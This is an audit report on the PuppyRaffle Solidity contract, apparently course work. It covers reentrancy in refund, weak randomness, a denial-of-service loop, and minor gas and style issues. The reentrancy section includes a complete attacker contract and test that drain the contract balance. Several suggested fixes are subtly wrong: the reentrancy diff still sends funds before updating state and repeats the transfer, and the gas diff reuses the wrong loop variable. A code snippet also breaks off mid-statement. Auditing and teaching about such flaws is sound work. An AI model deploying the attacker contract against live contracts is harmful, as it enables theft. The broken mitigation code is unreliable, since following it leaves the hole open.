### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance

**Description** : The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array.

```javascript
    function refund(uint256 playerIndex) public{
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender,"PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>        payable(msg.sender).sendValue(entranceFee);
@>        players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle till the contract balance is drained.

**Impact** : All fees paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concept:**

1. User enters the raffle
2. Attackers sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attackers enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract,, draining the contract balance.

**Proof of Code**

<details>
<summary>Code</summary>

Place the following into `PuppyRaffleTest.t.sol`

```solidity
  function test_reentrancyRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(puppyRaffle).balance;

        // attack
        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("starting attacker contract balance : ", startingAttackContractBalance);
        console.log("starting contract balance: ", startingContractBalance);

        console.log("ending attacker contract balance: ", address(attackerContract).balance);
        console.log("ending contract balance: ", address(puppyRaffle).balance);
    }

```

And this contract as well.

```solidity
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}
```

**Recommended Mitigation:** To prevent this, we should have the `PuppyRaffle:refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well

```diff
        function refund(uint256 playerIndex) public {
        // written-skipped MEV
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
        payable(msg.sender).sendValue(entranceFee);
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```

</details>

### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner and influence or predict the winning puppy

**Description:** Hashing `msg.sender`, `block.timestamp`, and `block.difficulty` together creates a predictable find number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.

_Note:_ This additionally means users could front-run this function and call `refund` if they see they are not the winner

**Impact:** Any user can influence the winner of the raffle, winning the money and selecting the `rarest` puppy. Making the entire raflfe worthless if it becomes a gas war as to who wins the raffles

**Proof of Concept:**

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that to predict when/how to participate. See the [solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao). `block.difficulty` was recently replaced with prevrandao
2. User can mine/manipulate their `msg.sender` value to result in their address being used to generated the winner!
3. Users can revert their `selecetWinner` transaction if they don't like the winner or resulting puppy.

Using on-chain values as a randomness seed is a [well-documented attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space

**Recommended Mitigation:** Consider usign a cryptographically provable random number generator such as Chainlink VRF.

### [M-#] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants

**Description:** The `PuppyRaffle:enterRaffle` function loops through the `players` array to check for duplicates. However, the longer
the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle stats will be dramatically lower than those who enter later. Every additional address in the `players` array, is an additional check the loop will have to make

```javascript
// @audit Dos Attack
@>    for(uint256 i = 0;i<players.length-1;i++){
        for(uint256 j = i+1;j<players.length;j++){
            require(players[i] != players[j],"PuppyRaffle:Duplicate Player");
        }
    }
```

**Impact:** The gas costs for raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering, and causing a rush at the start of a raffle to be one of the first entrantss in the queue.

An attacker might make the `PuppyRaffle::entrants` array so big, that no one else entersk, guarenteeing themselves the win

**Proof of Completion:**

If we have 2 sets of 100 players enter, the gas costs will be as such:

- 1st 100 players: ~6252048
- 2nd 100 players: ~18068138

This more than 3x more expensive for the second 100 players

<details>
<summary> PoC</summary>
Place the following

```javascript
    function test_denialOfService() public{

        vm.txGasPrice(1);

        // Let's enter 100 players
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for(uint256 i = 0;i<playersNum;i++){
            players[i] = address(i);
        }
        // see how much gas it costs
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value : entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();

        uint256 gasUsedFirst = (gasStart -gasEnd);
        console.log("Gas cost of the first 100 players: ",gasUsedFirst);

        // now for the 2nd 100 players
        address[] memory playersTwo  = new address[](playersNum);
        for(uint256 i = 0;i<playersNum;i++){
            playersTwo[i] = address(i+playersNum); // 0, 1, 2, -> 100, 101, 102
        }
        // see how much gas it costs
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value : entranceFee * players.length}(playersTwo);
        uint256 gasEndSecond = gasleft();
        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;
        console.log("Gas cost of the second 100 players: ",gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }

```

</details>

**Recommended Mitigation:** There are few recommendations.

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered

```diff
+ mapping(address => uint256) public addressToRaffleId;
+ uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable{
        require(msg.value == entranceFee * newPlayers.length,"PuppyRaffle: Must send enough to enter raffle");
        for(uint256 i = 0;i < newPlayers.length;i++){
            players.push(newPlayers[i]);
+           addressToRaffleId[newPlayers[i]] = raffleId;
        }
    }
-   // Check for duplicates
+   // Check for duplicates only from  the new players
+   for (uint256 i = 0; i < newPlayers.length; i++){
+        require(addressToRaffleId[newPlayers[i]] != raffleId,"PuppyRaffle: Duplicate Player");
+   }
-   for(uint256 i = 0; i < players.length; i++){
-       for(uint256 j = i +1;j<players.length; j++){
-            require(players[i]!=players[j],"PuppyRaffle: Duplicate player");
-         }
-      }
       emit RaffleEnter(newPlayers);
    }
.
.
    function selectWinner() external {
+       raffleId = raffleId +1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over ");
    }

```

Alternatively, you could see [Openzeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/5.x/api/utils#EnumerableSet).

# Low

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, causing a player at index 0 to incorrectly think they have not entered the raffle

**Description** If a player is in the `PuppyRaffle::players` array at index 0, this will return 0, but according to the natspec, it will also return 0 if the player is not in the array.

```solidity
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return
```

**Impact** A player at index 0 may incorrectly think they have not entered the raffle, and attempt to enter the raffle again, wasting gas

**Proof of Concept:**

1. User enters the raffle, they are the first entrant
2. `PuppyRaffle::getActivePlayerIndex` returns 0
3. User thinks they have not entered correctly due to the function documentation.

**Recommended Mitigation:** The easiest recommendation would be to revert if the player is not in the array instead of returning 0.

You could also reverse the 0th position for any competition, but a better solution might be to return an `int256` where the function returns -1 if the player is not active

# Gas

### [G-1] Unchanged state variables should be declared constant or immutable.

Reading from storage is much more expensive than reading from a constant or immutable variable.

Instances:

- `PuppyRaffle:raffleDuration` should be `immutable`
- `PuppyRaffle:commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`

### [G-2] Storage variables in a loop should be cached

Everytime you call `players.length` you read from storage, as opposed to memory which is more gas efficient

```diff
+ uint256 playerLength = players.length;
-   for (uint256 i = 0; i < players.length - 1; i++) {
+   for (uint256 i = 0; i< playersLength -1 ;i ++){
-            for (uint256 j = i + 1; j < players.length; j++) {
+            for (uint256 i = 0; i< playersLength -1 ;i ++){
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

### [I-1] Solidity pragma should be specific, not wide

Consider using a specific version of in your contracts instead of a wide version.
For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol: 22:23:35

## [I-2] Using an outdated version of Solidity is not recommended.

solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement

**Recommendation**:
Deploy with any of the following Solidity versions:

`0.8.18`
The recommendations take into account:

- Risks related to recent releases
- Risks of complex code generation changes
- Risks of new language features
- Risks of known bugs
- Use a simple prama version that allows any of these versions. Consider using the latest version of Solidity for testing

Please see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more info

### [I-3] Missing checks for `address(0)` when assigning values to address state variables

Assigning values to address state variables without checking for `address(0)`.

- Found in src/PuppyRaffle.sol: 8662:23:35
- Found in src/PuppyRaffle.sol: 3165:24:35
- Found in src/PuppyRaffle.sol: 9809:26:32

### [I-4] `PuppyRaffle::selectWinner` does not follow CEI, which is not a best practice

It's best to keep code clean and follow CEI (Checks,Effects, Interactions).

```diff
-      (bool success) = winner.call{value: prizePool}("");
-       require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner,tokenId);
+       (bool success,) = winner.call{value : prizePool}("");
+       require(success,"PuppyRaffle: Failed to send prize pool to winner");
```

### [I-5] Use of "magic" numbers is discouraged

It can be confusing to see number literals in a codebase and it's much more readable if the numbers are given a name

Examples:

```solidity
   uint256 prizePool = (totalAmountCollected * 80)/100;
   uint256 fee = (totalAmountCollected * 20)/100;
```

Instead, you could use:

```solidity
     uint256 public constant PRIZE_POOL_PERCENTAGE=80;
     uint256 public constant FEE_PERCENTAGE = 20;
     uint256 public constant POOL_PRECISION = 100;
```

# Additional findings not taught in course
